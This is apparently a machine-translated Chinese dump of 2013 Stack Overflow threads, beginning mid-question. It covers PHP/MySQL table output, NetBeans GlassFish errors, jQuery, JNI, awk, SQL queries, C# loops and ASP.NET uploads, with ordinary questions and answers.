该数据中包含的变量是：指定的 NCL 编号、医院、年龄、性别、原发性癌症以及患者的诊断日期和最新治疗。

```
<style type="text/css">
  table.data { width:100%;  margin: 0;
      border: 1px solid black; border-spacing: 2px; }
  .id {width: 7%; background-color: #c7c7c0; }
  .date {width: 12%; background-color: #d8d8d1; }
  .nclnumber { width: 10%; background-color: #c7c7c0; }
  .hospital {width: 17%; background-color: #d8d8d1; }
  .age { width: 3%; background-color: #c7c7c0; }
  .sex { width: 2%; background-color: #d8d8d1; }
  .cancer { width: 10%; background-color: #d8d8d1; }
  .dateofdiagnosis { width: 7%; background-color: #d8d8d1; }
  .notes { width: 32%; background-color: #d8d8d1; }  
</style> 

<table class="data" border="0" cellspacing="2">
  <tr>
    <td class="id"><b>Id</b></td>
    <td class="date"><b>Date</b></td>
    <td class="nclnumber"><b>NCL Number</b></td>
    <td class="hospital"><b>Hospital</b></td>
    <td class="age"><b>Age</b></td>
    <td class="sex"><b>Sex</b></td>
    <td class="cancer"><b>Diagnosed Cancer</b></td>
    <td class="dateofdiagnosis"><b>Date of Diagnosis</b></td>
    <td class="notes"><b>Notes</b></td>
   </tr>
 </table>

<?php
// Connects to your Database 
mysql_connect("localhost", "root", "") or die(mysql_error()); 
 mysql_select_db("cancer") or die(mysql_error()); 
 $data = mysql_query("SELECT * FROM cancer WHERE Age ='1'OR Age = '2' OR Age = '3'OR Age = '4'OR Age = '5'OR Age = '6'OR Age = '7'OR Age = '8'OR Age = '9'")  
 or die(mysql_error()); 

while($info = mysql_fetch_array( $data )) {
  echo "<table class='data' border='0' cellspacing='2'>
          <tr>
            <td class='id'>".$info['Id']."</td>
            <td class='date'>".$info['Date']."</td>
            <td class='nclnumber'>".$info['NCL_Number']."</td>
            <td class='hospital'>".$info['Hospital']."</td>
            <td class='age'>".$info['Age']."</td>
            <td class='sex'>".$info['Sex']."</td>
            <td class='cancer'>".$info['Diagnosed_Cancer']."</td>
            <td class='dateofdiagnosis'>".$info['Date_of_Diagnosis']."</td>
            <td class='notes'>".$info['Notes']."</td>
          </tr>
        </table>";
  }
?> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T17:15:55.823

绝对没有理由不对`<table>`表格数据使用元素。

有些人的反表格歇斯底里只是一种误解：滥用表格*进行布局*是不好的。不过，HTML 标记没有任何问题。事实上，使用任何其他 HTML 元素来显示表格数据对语义都是不利的。

`<table>`标签及其包含的行`<tr>`和`<td>`列通知呈现它的浏览器其中的数据是相关的和列式的。不要将`<table>`（或任何与此相关的 HTML 标记）视为严格的视觉显示元素。它们将有关数据的含义传达给正在解析它的机器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:23:51.730

让我们解决一些困惑。显示 in`CSS`而不是，`tables`因为 as`tables`及其关联的标签是 HTML 元素，并且`CSS`是可以应用于这些元素的样式。它们不是等价的。

表格的替代方案是使用 和 的组合创建一个复杂、复杂和令人费解的`divs`布局`spans`。

但是，如果数据是表格的，那么绝对没有理由为了避免使用`<table>`标签而为这种尴尬的设计而烦恼。这就是`<table>`标签在 HTML 规范中的原因。

出于布局目的滥用`<table>`标签给标签带来了不好的声誉。但是，如果使用得当（即显示表格数据），它会非常有用。

最佳建议：使用`<table>`标签并遵循社区 wiki 的建议。

# netbeans - GlassFish Server 适用于 Netbeans 7.2 但不适用于 7.3

> ID：15163190
> 
> 赞同：1
> 
> 时间：2013-03-01T17:13:54.797
> 
> 标签：netbeans, glassfish-3, netbeans-7.3

我刚刚安装了 Netbeans 7.3。准备了一个示例 Web 应用程序。但是 Glassfish 没有启动。错误消息是“....\nbproject\build-impl.xml:1036：部署错误：GlassFish Server 3+ 服务器启动失败。无法创建启动过程。有关详细信息，请参阅服务器日志。”

不幸的是，服务器日志中没有任何内容。我删除了域文件夹和服务器，然后重新创建。没有改变。:(

[它是与http://netbeans.org/bugzilla/show_bug.cgi?id=217228](http://netbeans.org/bugzilla/show_bug.cgi?id=217228)相关的错误吗？

有什么解决办法吗？

我的系统是带有土耳其语言环境的 64 位 Windows 7。Web 应用程序基于 Primefaces，JSF 2.1

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T10:12:45.953

我认为这与语言设置有关。您可以在 netBeans 配置文件 ($NETBEANSHOME/etc/netbeans.conf) 中更改本地化设置。只需将“--locale en”添加到“netbeans_default_options”行的末尾即可。

您也可以按照以下步骤使用 asaadmin 工具启动 glassfish。

1- 执行 C:\Program Files\glassfish-3.1.2.2\bin\asaadmin.bat 2- 启动域

# jquery - 高亮【添加类】每个表格列的最大值

> ID：15163202
> 
> 赞同：0
> 
> 时间：2013-03-01T17:14:48.610
> 
> 标签：jquery

我会给你我想这样做的确切表格的链接： http://pt.omerta-stats.tk/?page= [smuggling](http://pt.omerta-stats.tk/?page=smuggling)

例如，该页面上的第一个表。表格左侧有 8 个城市，每个城市 7 种产品的价格。让我们专注于`Morphine`专栏。其中一个城市的价格最高，而另一个城市的价格最低。我想为这些表格单元格添加一个 CSS 类。

这必须对所有表列进行。

随意使用 PHP、JQuery、简单的 JavaScript、纯 CSS 或其他。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T19:55:56.217

像下面这样的东西会为你解决问题。您可以将其重构为更通用，因为我只是在处理您的具体示例以帮助您入门。

```
var tdCount = $('#narcsTable tr:eq(1) td').length,
    trCount = $('#narcsTable tr').length;

for (var i = 1; i < tdCount; i++) {
    var $td = $('#narcsTable tr:eq(2) td:eq(' + i + ')'),
        highest = 0,
        lowest = 9e99;

    for (var j = 3; j < trCount; j++) {
        $td = $td.add('#narcsTable tr:eq(' + j + ') td:eq(' + i + ')');
    }

    $td.each(function(i, el){
        var $el = $(el);
        if (i >= 0) {
            var val = parseInt($el.text().replace(/[\$,]/g, ''), 10);
            if (val > highest) {
                highest = val;
                $td.removeClass('high');
                $el.addClass('high');
            }
            if (val < lowest) {
                lowest = val;
                $td.removeClass('low');
                $el.addClass('low');
            }
        }
    });
} 
```

编辑为`i >= 0`因为第一个 i 是 0（演示未更新）

## [看演示](http://jsfiddle.net/Ttqb8/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-22T11:51:44.297

在这种情况下，有时单元格值是空的，上述答案都不起作用我通过更新@mVChr 代码来解决这个问题。

```
function HighlightColumn() {
        try {
            var tdCount = $('#narcsTabletr:eq(1) td').length;
            var trCount = $('#narcsTabletr').length;

            for (var i = 1; i < tdCount; i++) {
                var $td = $('#narcsTabletr:eq(2) td:eq(' + i + ')');

                for (var j = 3; j < trCount; j++) {
                    $td = $td.add('#narcsTabletr:eq(' + j + ') td:eq(' + i + ')');
                }
                var cellprice = [];
                $td.each(function (i, el) {
                    var $el = $(el);
                    var cellValue = parseInt($el.text().replace(/[\$,]/g, ''), 10);
                    if (!isNaN(cellValue)) {
                        cellprice.push(cellValue);
                    }
                });

               // console.log(cellprice);

                var minValue = cellprice.min();
                var maxValue = cellprice.max();

              //  console.log('minValue=' + minValue);
              //  console.log('maxValue=' + maxValue);

                $td.each(function (i, el) {
                    var $el = $(el);
                    if (i >= 0) {
                        var cellValue = parseInt($el.text().replace(/[\$,]/g, ''), 10);

                        if (cellValue == minValue) {
                            $el.addClass('low');
                        }
                        if (cellValue == maxValue) {
                            $el.addClass('high');
                        }
                    }
                });
            }
        } catch (exception) {
            console.log(exception);
        }
    }
    Object.defineProperty(Array.prototype, "max", {
        enumerable: false,
        configurable: false,
        writable: false,
        value: function () {
            return Math.max.apply(null, this);
        }
    });
    Object.defineProperty(Array.prototype, "min", {
        enumerable: false,
        configurable: false,
        writable: false,
        value: function () {
            return Math.min.apply(null, this);
        }
    }); 
```

# c++ - 如何从 jobjectArray 中释放对象？

> ID：15163204
> 
> 赞同：0
> 
> 时间：2013-03-01T17:14:49.483
> 
> 标签：c++, c, java-native-interface

我有以下代码：

```
jobjectArray objects; //function argument, actually a byte[][]
jbyteArray* arrays = malloc(sizeof(jbyteArray), 2); // Assume 2
for(int i = 0; i < 2; ++i) {
    arrays[i] = (jbyteArray)env->GetObjectArrayElement(objects, i);
}

// Do stuff with arrays.

// Do I have to do this?
// for(int i = 0; i < 2; ++i) {
//     env->DeleteLocalRef(arrays[i]);
// }
free(arrays); 
```

这足以避免泄漏内存/保留杂散引用吗？还是我也应该调用 DeleteLocalRef？

[编辑：我确实在IBM SDK for Java](http://publib.boulder.ibm.com/infocenter/javasdk/v5r0/index.jsp?topic=/com.ibm.java.doc.diagnostics.50/diag/understanding/jni_refs.html)的帮助中找到了此参考资料，其中指出当函数返回 Java 时会自动清理它们。但是如果没有自动垃圾回收，引用可能会泄漏。

# node.js - 从纯 js 连接到 socket.io

> ID：15163206
> 
> 赞同：1
> 
> 时间：2013-03-01T17:14:53.017
> 
> 标签：node.js, websocket, socket.io

嗨，我正在寻找一个文档或示例，以从客户端的纯 JS 连接到在服务器端的 nodejs 上运行的 socket.io。

我必须从客户端删除 socket.io.js 库。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T14:04:11.820

socket.io 提供了各种传输层。如果您乐于尝试并确定您的客户端在所有情况下都支持 WebSocket，那么您可能会成功地在客户端复制 socket.io 协议的基于 WebSocket 的部分。然而，与仅使用无论如何都会重新发明（部分）的代码相比，这似乎是一项乏味的任务。

**在客户端使用 socket.io，或者在服务器端采用完全不同的方法。**

# jquery - 对内容执行 jQuery 函数后刷新页面

> ID：15163211
> 
> 赞同：1
> 
> 时间：2013-03-01T17:15:18.397
> 
> 标签：jquery, ajax, page-refresh, emoticons

我有一个 jQuery 函数，它对整个 HTML 页面应用一些格式。我已成功执行此功能。

```
jQuery.fn.emoticons= function(iconfolder) {
    //some operations
}; 
```

此函数的目的是将所有表情符号（：D）转换为笑脸图像。该函数对整个 HTML 内容都有影响。

我想要实现的是，我希望这个函数每 x 秒执行一次，并且基于它应该更改页面内容。

由于我对 jQuery 的了解有限，我知道 $.ajax() 可以基于 URL 而不是函数使用。

实现这一目标的最佳方法是什么？

编辑：

根据以下输入，我尝试了这个并且有效。谢谢大家。

```
$(function() {
   setInterval(function() { $(".ow_content").emoticons() },5000);
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:29:55.737

只需设置一个间隔`setInterval()`：

```
$.fn.emotions = function() {
   currentHTML = $("body").html();
   newHTML = currentHTML.replace(/:D/,"<img src='/your/image/path'/>");
   $("body").html(newHTML);
};

$(function() {
    waitSeconds = 5;
    setInterval($.fn.emotions, waitSeconds*1000);
}); 
```

这[是 jsFiddle](http://jsfiddle.net/amullins/f2Vnn/1/)让你玩它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:54:11.297

使用 setInterval 在指定时间后执行函数。

setInterval(someFunction(),1000);

其中 1000 是以毫秒为单位的时间，即 1 秒。

在这种情况下，函数 someFunction 将每秒运行一次。

现在使用它你可以调整你的代码逻辑。

# php - mysql重新排序具有唯一约束的行

> ID：15163214
> 
> 赞同：0
> 
> 时间：2013-03-01T17:15:21.667
> 
> 标签：php, mysql, sql, algorithm

我在想出一个有效的解决方案来解决这个问题时遇到了一些麻烦。也许我让它变得比需要的更复杂。我有一张这样的桌子：

```
thing_id | user_id | order
    1         1        0
    2         1        1
    3         1        2 
```

用户可能会弄​​乱他们的东西，并且可能会发生他们将事物 1 更改为事物 3，并将事物 3 更改为事物 1。在我的情况下，并不是用户明确更改了顺序。相反，他们正在修改他们的事物库，他们可能会将槽 1 中的事物更改为槽 3 中的事物，反之亦然。因此，如果用户执行此操作，表格应如下所示：

```
thing_id | user_id | order
    3         1       0
    2         1       1
    1         1       2 
```

使这更复杂的是 (thing_id, user_id) 具有唯一约束，因此执行顺序更新并不完全有效。如果我尝试这样做`UPDATE tbl SET thing_id=3 WHERE thing_id=1`，则唯一约束被打破。

订单栏纯粹是为了展示，以便按字母顺序排列。所以我想我可以使用 PHP 来检查顺序并像这样计算出来，但这会引入与重要内容无关的代码。我想找到一个纯粹/主要是 SQL 的解决方案。

同样，如果我要在表中插入一个新行，我希望 order 值为 3。在 SQL 中是否有一种有效的方法可以做到这一点，而无需先行`SELECT MAX(order) WHERE user_id=1`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:47:37.000

我的评论似乎得到了一些关注，因此我将其发布为答案...为避免您的问题，请添加一个没有约束的新列，并将其用于用户所需的更新。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T18:30:23.610

你为什么不更新订单而不是更新东西？

```
UPDATE tbl
    SET order = 2
    WHERE thing_id=1; 
```

每行代表一个“事物-用户”对。*数据*是您要使用的排序。您不想更改实体（“事物用户”）。您想更改数据。

顺便说一句，您必须做一些额外的工作来保持订单中的唯一值。

如果你改变了这一点并将唯一约束放在 上`user_id, order`，那么更新 thing_id 是有意义的。

# javascript - 动态脚本未加载到 history.go()

> ID：15163217
> 
> 赞同：1
> 
> 时间：2013-03-01T17:15:28.983
> 
> 标签：javascript, jquery, browser-history

我有一个我无法编辑的静态 html 页面——它确实引用了一个 js 文件，所以我所做的就是将我的 IIS 服务器上的那个 url 请求重定向到我的 js 文件——我在其中动态注入 jQuery 以便我可以使用它。这是我用来插入 jQuery 的代码：

```
var script = document.createElement( 'script' );
script.src = 'http://code.jquery.com/jquery-1.9.1.js';
script.type = 'text/javascript';
script.onload = jqueryReady;              //most browsers
script.onreadystatechange = function () { //ie
    if ( this.readyState == 'complete' ) {
        jqueryReady();
    }
}; 
```

这很好用，除非在一种特定情况下——如果我在浏览器是 IE 并且页面正在从内部 Web 服务器提供服务时在页面上调用 history.go()。按 F5 也不会正确重新加载页面。我必须将光标放在地址栏中并按回车键才能正确加载。

编辑：忘了提到显而易见的 - 我在 jqueryReady() 函数中有一个断点 - 它永远不会被击中 - 这就是问题所在......

如果我向上提供页面然后触发 history.go() （单击按钮），它在我的开发环境中的 IE 工作正常。它适用于chrome，尚未测试Firefox。

那么是否有替代 history.go() 来触发“真实”页面重新加载的方法，就像在地址栏中点击输入一样？

这也是一个巨大的页面——6000 行 html（不是我写的）和 jQuery 以及所有的 javascript 都加载在头部——我知道你应该在页面末尾加载 js 内容。也许这是相关的？感觉是时间问题。。。

有人对要检查/尝试的事情有任何想法吗？或者知道发生了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:42:02.363

好的，找到了...所以解决方案就[在这里](http://msdn.microsoft.com/en-us/library/ie/hh180173%28v=vs.85%29.aspx)

底线是我使用的代码不正确，这是将脚本动态插入文档然后处理就绪事件的推荐方法：

```
var script = document.createElement( "script" );
script.src = "/reporter/scripts/jquery-1.9.1.min.js";
if ( script.addEventListener ) {
    script.addEventListener( "load", jqueryReady, false );
}
else if ( script.readyState ) {
    script.onreadystatechange = jqueryReady;
}
document.getElementsByTagName( 'head' )[0].appendChild( script ); 
```

此外，我需要检查我的 jqueryReady 函数中是否加载了 jQuery：

```
function jqueryReady() {
    // Check if jQuery exists
    if ( typeof jQuery != 'undefined' ) {
        // do stuff like $(document).ready()
    }
} 
```

这似乎适用于我能找到的所有情况。

希望这对其他人有帮助！

# php - REST 服务不工作-Code Igniter

> ID：15163218
> 
> 赞同：3
> 
> 时间：2013-03-01T17:15:34.710
> 
> 标签：php, codeigniter, rest

我想在我的项目中实现一个 Phill Sturgeon CodeIgniter RESTServer 库。我分别在文件夹**config、library、library**
中复制了文件**rest.php、Format.php、REST_Controler.php**。

 **我使用以下代码创建了名为 services 的控制器：

```
<?php
require(APPPATH.'/libraries/REST_Controller.php');

class services extends REST_Controller {  

    function Teams_get(){

        $teamNames=$this->team_model->getTeamNames();

         $this->response($teamNames);
    } 
```

TeamModel 在我的**autoload.php**中自动加载。当我想在浏览器中运行 Teams_get 方法时，结果是：

`{"status":false,"error":"Unknown method."}`

我[在这里](http://ellislab.com/forums/viewthread/205468/)读到我应该更改**REST_Controler.php**配置文件，但只有在 POST 方法不起作用时才应该进行此更改。

我的服务应该是公开的，所以我不需要身份验证方法。

这里有什么问题？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-01T20:25:10.927

调用 API 时，URL 应该只是方法的名称，不带`_get`（或`_post`）。这由 REST 服务器根据 URL 的调用方式 ( `GET`vs `POST`) 添加。

因此，要调用您的方法，您需要向 URL （而不是）`Teams_get`发送`GET`请求。`/services/Teams``/services/Teams_get`

文档：[https ://github.com/philsturgeon/codeigniter-restserver#handling-requests](https://github.com/philsturgeon/codeigniter-restserver#handling-requests)**

# for-loop - awk 在 for 循环中不起作用

> ID：15163219
> 
> 赞同：0
> 
> 时间：2013-03-01T17:15:40.007
> 
> 标签：for-loop, awk

我有一个运行良好的 awk 命令：

```
awk '$1==1{print $1,$2,$4}' file > out1 
```

但是，如果我将相同的 awk 命令放在 for 循环中，我只会得到 emtpy 输出文件：

```
for i in {1..22}
do
awk '$1==$i{print $1,$2,$4}' file > out$i
done 
```

这给出了 22 个空输出文件。for循环有什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:25:21.267

尝试：

```
for i in {1..22}
do
awk -v num="$i" '$1==num{print $1,$2,$4}' file > out$i
done 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:24:52.120

试试这一行：

```
awk -vvar="$i" '$1==var{print $1,$2,$4}' file >out$i 
```

实际上你不需要那个 for 循环，如果你的 $1 总是一个整数，也试试这个：

```
awk '$1>0&&$1<=22{print $1,$2,$4>"out"$1}' file 
```

# php - Mysql当前日期与数据库中存储的日期之间的日期差异

> ID：15163226
> 
> 赞同：0
> 
> 时间：2013-03-01T17:15:52.040
> 
> 标签：php, mysql, cakephp, date

我的任务是从具有大于或等于 2 年经验的表中获取员工列表。我有`'joined_date'`表中的字段。我`employee`正在使用 cakephp 框架。你能建议我获取详细信息的方法吗？提前谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:33:10.333

您首先需要使用各种方法之一连接到数据库。然后使用 SQL 获取记录。

假设**joined_date**字段是一个时间戳，并且在一个名为**employee** ...

这是使用 odbc_connect 的示例...

```
<?php
    // Connect to the database
    $conn = odbc_connect($server ,$username ,$password );

    // Define the query
    $query = "
        SELECT * FROM employee
        WHERE joined_date >= now() - INTERVAL 2 YEAR
    ";

    // Execute the query and assign the results to a resource
    $res = odbc_exec($conn,trim($query));

    // Loop through the results 
    while($row = odbc_fetch_array($res)) 
    {
        print_r($row);
    }

    // Close the connection
    odbc_close($conn);
?> 
```

[PHP odbc_connect](http://www.php.net/manual/en/function.odbc-connect.php)

[MySQL 日期和时间函数](https://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html)

# jquery - jquery从类中删除所有类

> ID：15163229
> 
> 赞同：6
> 
> 时间：2013-03-01T17:15:57.990
> 
> 标签：jquery

如何从课程中删除所有课程但保留原始课程？

html

```
<div class="document-wrapper removeme1 removeme2 removeme3"></div> 
```

jQuery

```
$('.document-wrapper').removeClass(); 
```

以此结束

```
<div class="document-wrapper"></div> 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-01T17:17:33.093

`$('.document-wrapper').removeClass().addClass('document-wrapper');`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T17:17:21.953

像这样

```
$('.document-wrapper').removeClass().addClass('document-wrapper'); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-01T17:18:39.390

覆盖`class`属性：

```
$('.document-wrapper').attr('class', 'document-wrapper'); 
```

`class`这将用'document-wrapper'替换当前值

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T17:22:47.487

试试这个：

```
 $('.document-wrapper').removeAttr('class').addClass('document-wrapper'); 
```

[**在这里检查一下小提琴**](http://jsfiddle.net/FsUCg/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T17:35:20.813

只需覆盖`className`底层 DOM 元素的属性。

```
$('.document-wrapper')[0].className = "document-wrapper"; 
```

# sql - SQL Query , Group by 打印太多记录

> ID：15163230
> 
> 赞同：-1
> 
> 时间：2013-03-01T17:16:00.690
> 
> 标签：sql, vb.net, select

我有两个下表

```
Emp_ID   FirstName
------------------------------
1            John
2            Mark
3            Steve 
```

表 2：Emp_Transaction

```
Trans ID    Emp_ID    start_Date  End_date    Paid_status  Total_Hours     Total_Pay
---------------------------------------------------------
1               1     01/07/13    01/14/2013     True       15.00       75.00
2               1     01/15/13    01/21/2013     False      10.00       50.00
3               1     01/21/13    01/27/2013     False      10.00       50.00

4               2     01/07/13    01/14/2013     False      15.00       75.00
5               2     01/15/13    01/21/2013     False      10.00       50.00
6               2     01/21/13    01/27/2013     False      10.00       50.00

7               3     01/07/13    01/14/2013     True       15.00       75.00
8               3     01/15/13    01/21/2013     True       10.00       50.00
9               3     01/21/13    01/27/2013     False      10.00       50.00 
```

结果应该像这样打印（最早的未付日期）

```
ID  FirstName   start_Date  End_date    Paid_status  Total_Hours     Total_Pay
--------------------------------------------------------------
1             John      01/15/13    01/21/2013   False      10.00       50.00            
2             Mark      01/07/13    01/14/2013   False      15.00       75.00            
3             steve     01/21/13    01/27/2013   False      10.00       50.00 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:19:59.893

由于您没有提及您正在使用的 RDBMS，因此下面的查询几乎适用于所有 RDBMS（*不是全部*）

```
SELECT  a.*, b.*
FROM    users a
        INNER JOIN Emp_transaction b
            ON a.Emp_ID = b.Emp_ID
        INNER JOIN
        (
            SELECT  Emp_ID, MIN(start_DATE) min_date
            FROM    emp_transaction
            WHERE   Paid_Status = 'False'
            GROUP   BY Emp_ID
        ) c ON b.Emp_ID = c.Emp_ID AND
                b.start_date = c.min_DATE 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!2/4df00/1)

但如果您的 RDBMS 支持`Window Functions`，

```
SELECT  a.*,
        b.TransID, b.start_Date, b.End_date, 
        b.Paid_status, b.Total_Hours, b.Total_Pay
FROM    users a
        INNER JOIN
        (
            SELECT  TransID, Emp_ID, start_Date, End_date, Paid_status, Total_Hours, Total_Pay,
                    ROW_NUMBER() OVER (PARTITION BY Emp_ID ORDER BY start_Date ASC) rn
            FROM    emp_transaction
            WHERE   Paid_status = 'False'
        ) b ON a.Emp_ID = b.Emp_ID AND
                b.rn = 1 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!6/2a8a4/3)

# c# - 将 foreach 与数组一起使用并遇到问题的新手

> ID：15163232
> 
> 赞同：-1
> 
> 时间：2013-03-01T17:16:16.313
> 
> 标签：c#, arrays, foreach

我正在尝试获取一个类中的数组，然后使用 foreach 语句将值迭代到表中。

我的班级设置如下：

```
public class items
{
   private string[] list;

   public items()
   {
      list[0] = "apples";
      list[1] = "oranges";
      list[2] = "grapes";
      list[3] = "bananas";
   }
} 
```

在我的`page_load`事件中，我试图打电话给班级：

```
list fruit = new list();

StringBuilder sb = new StringBuilder();

sb.Append("<table id=\"items\">");
sb.Append("<tr>");
sb.Append("<th>Item</th>");
sb.Append("<th>Description</th>");
sb.Append("<th>Unit Cost</th>");

foreach(string fruit in list)
{
   sb.Append(String.Format("{0}", items.fruit));
} 
```

我是使用`foreach`循环的新手，它真的很混乱。如果我走在正确的轨道上，我希望能有所了解。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:21:45.897

如果您想围绕水果列表构建 HTML 表格的标记，您应该将在每个单独项目周围进行标记的部分也放入循环中：

```
 sb.Append("<table id=\"items\">");
 sb.Append("<tr>");
 sb.Append("<th>Item</th>");
 sb.Append("<th>Description</th>");
 sb.Append("<th>Unit Cost</th>");
 sb.Append("</tr>");
 foreach(var fruit in list) { // Use "var" or the exact type for the fruit
     sb.Append("<tr>");
     // I am assuming here that the fruit has Description and Cost.
     // You may need to replace these names with names of actual properties
     sb.Append(String.Format("<td>{0}</td>", fruit.Description));
     sb.Append(String.Format("<td>{0}</td>", fruit.Cost));
     sb.Append("</tr>");
 }
sb.Append("</table>"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:22:56.223

你的代码有一些问题。首先，`items.list`在课堂之外无法访问，因此无法在您的事件`items`中遍历它。`page_load`您必须使其可访问：

```
public class items
{
   private string[] list;

   public string[] List
   {
      get { return list; }
   }

   // ...
} 
```

现在，您将能够`items`像在上一样实例化您的类`page_load`：

```
items fruit = new items(); 
```

并遍历你的类的`List`属性：`items`

```
foreach(string f in fruit.List)
{
   sb.Append(String.Format("{0}", f));
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:23:35.520

使用`Linq`：假设你的数组是水果

```
fruit.ToList().ForEach(f=> sb.Append(String.Format("{0}", f)); 
```

理想情况下，如果您有`description`并且`unitCost`在您的列表中，您可以将所有`<tr>`标签添加到表格正文中，例如；

```
StringBuilder sb = new StringBuilder();
sb.Append("<table id=\"items\">");
sb.Append("<tr><th>Item</th><th>Description</th><th>Unit Cost</th></tr>");

newList.ToList()
 .ForEach(f=> 
          sb.Append(String.Format("<tr><td>{0}</td><td>{1}</td><td>{2}</td></tr>", 
                         f.item, f.desc, f.unitCost))
         );
sb.Append("</table>"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T17:17:37.057

你想要的是这样的：

```
sb.Append("<table id=\"items\">");
sb.Append("<tr>");
sb.Append("<th>Item</th>");
sb.Append("<th>Description</th>");
sb.Append("<th>Unit Cost</th>"); 
sb.Append("</tr>");
foreach(string fruit in list)
{
   sb.Append("<tr>");
   sb.Append(String.Format("{0}", fruit));
   sb.Append("description");
   sb.Append(String.Format("2p");
   sb.Append("</tr>");
}
sb.Append("</table>"); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T17:19:10.340

尝试

```
foreach(string s in fruit)
{
    sb.Append(String.Format("{0}", s));
{ 
```

# asp.net - 图片上传后临时存放在哪里？

> ID：15163238
> 
> 赞同：2
> 
> 时间：2013-03-01T17:16:41.823
> 
> 标签：asp.net

我不是一个程序员，所以对于我可能对这个问题缺乏理解，我深表歉意。我一直在挖掘所有代码，但我无法弄清楚这一点。该站点是一个asp.net 站点。编译时没有错误，除了关于高度的错误，这不适用。我使用的是共享主机，所以我无法访问系统文件。

客户将图像上传到我们的网站，以便我们处理和打印他们订购的任何产品。在他们点击继续付款按钮之前，图像不会出现在服务器上的任何位置。我在验证文件夹大小之前和之后都下载了整个站点。

图像在实际存储为 .jpg 之前临时存储在哪里？

```
 </asp:UpdatePanel>
    <asp:Button CssClass="Buttons" ID="Button1" 
        style="font-weight: bold; color: white; background-color: #336699;" 
        runat="server" OnClick="AddToCartButton_Click" 
        Text="Upload Image and Add To Cart" 
        CommandArgument="ObjectDataSourceEventArgs" />
&nbsp; 
<div style="width:800px">
    <br />
    Larger files may take a minute or two to upload
    <asp:Label ID="lblLimitReached" runat="server" 
        Visible="false" STYLE="color:Red" Text="">
    </asp:Label>
</div>
<br /><hr /><br />
<asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" BorderStyle="Solid"
    Caption="Shopping Cart" CellPadding="4" DataSourceID="ShoppingCartDataSource"
    ForeColor="#333333" GridLines="Vertical" CaptionAlign="Top" OnRowDeleting="GridView1_RowDeleting">
    <FooterStyle BackColor="#507CD1" Font-Bold="True" ForeColor="White" />
    <Columns>
        <asp:BoundField DataField="OriginalImageName" HeaderText="Image" SortExpression="OriginalImageName" />
        <asp:BoundField DataField="SizePrice" HeaderText="Size / Price" SortExpression="SizePrice" />
        <asp:BoundField DataField="Quantity" HeaderText="Quantity" SortExpression="Quantity" />
        <asp:BoundField DataField="MountedString" HeaderText="Mounted" SortExpression="Mounted" />
        <asp:BoundField DataField="DigitalString" HeaderText="Digital Frame" SortExpression="DigitalFrame" />
        <asp:BoundField DataField="BWString" HeaderText="Black &amp; White" SortExpression="BlackAndWhite" />
        <asp:BoundField DataField="PriceString" HeaderText="Price" ReadOnly="True" SortExpression="PriceString" />
        <asp:CommandField ButtonType="Button" ShowDeleteButton="True" />
    </Columns>
    <RowStyle BackColor="#EFF3FB" />
    <EditRowStyle BackColor="#2461BF" />
    <SelectedRowStyle BackColor="#D1DDF1" Font-Bold="True" ForeColor="#333333" />
    <PagerStyle BackColor="#2461BF" ForeColor="White" HorizontalAlign="Center" />
    <HeaderStyle BackColor="#507CD1" Font-Bold="True" ForeColor="White" />
    <AlternatingRowStyle BackColor="White" />
</asp:GridView>
<asp:ObjectDataSource ID="ShoppingCartDataSource" runat="server" DataObjectTypeName="ImageInfo"
    DeleteMethod="DeleteData" InsertMethod="InsertData" SelectMethod="SelectData"
    TypeName="ImageInfoCollection" UpdateMethod="UpdateData" OnObjectCreating="ShoppingCartDataSource_ObjectCreating" ></asp:ObjectDataSource>
<hr /><br />
<asp:Label ID="TotalPriceLabel" runat="server" style="display:inline" Text="Current total: $0.00" Width="162px"></asp:Label>
    <br />
<asp:Button CssClass="Buttons" ID="CheckOutButton" runat="server" 
    Text="Go To Check Out" CausesValidation="False" 
    OnClick="PlaceOrderButton_Click" 
    style="font-weight: bold; color: white; background-color: #336699;" 
    Visible="False" /><br />
<asp:Label ID="FreeShipLabel" runat="server" ForeColor="#FF0033"></asp:Label><br />
<asp:XmlDataSource ID="ImageSizeDataSource" runat="server" DataFile="~/App_Data/ImageSizeData.xml"></asp:XmlDataSource>
<asp:RequiredFieldValidator ID="ImagePathValidator" runat="server" ControlToValidate="FileUpload1"
    ErrorMessage="Please select an image to upload." Display="None"></asp:RequiredFieldValidator>
<asp:RegularExpressionValidator ID="FileUploadTypeValidator" runat="server" ControlToValidate="FileUpload1"
    Display="None" ErrorMessage="Please upload only files of type jpg (or jpeg)."
